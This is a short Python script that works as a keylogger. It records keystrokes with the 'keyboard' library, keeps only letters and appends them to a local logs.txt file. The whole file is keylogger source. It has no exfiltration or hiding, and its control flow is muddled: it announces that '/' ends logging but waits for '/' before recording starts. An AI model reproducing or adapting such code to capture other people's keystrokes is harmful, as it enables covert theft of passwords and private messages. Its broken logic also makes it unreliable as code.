import os
import keyboard  # for keylogs

# Use a string to store the captured keyboard input
key_logs = ""

# Create a flag to indicate the end of logging
end_logging_flag = False

# Define the key combination to end logging (e.g., pressing '/' key)
end_logging_key = "/"

# Define the path to the log file
log_file_path = os.path.join(os.getcwd(), 'logs.txt')

def report(logs):
    """
    Writes the contents of the keyboard logs to a text file named 'logs.txt'.
    """
    with open(log_file_path, 'a') as f:  # Use 'a' (append) mode to add to the file
        f.write(logs)

print("Press '/' key to end logging.")
keyboard.wait(end_logging_key)  # Wait for the '/' key press to end logging

# Capture keyboard input
keyboard.start_recording()

while True:
    if keyboard.is_pressed(end_logging_key):
        end_logging_flag = True
        break

# Get the recorded keyboard events
events = keyboard.stop_recording()

# Process the events and append to key_logs
for event in events:
    if event.event_type == keyboard.KEY_UP:
        key_logs += event.name

# After logging is finished, write the key logs horizontally
key_logs = ''.join(filter(str.isalpha, key_logs))
if key_logs:
    report(key_logs)
    print("Logging finished.")
else:
    print("No keyboard input logged.")
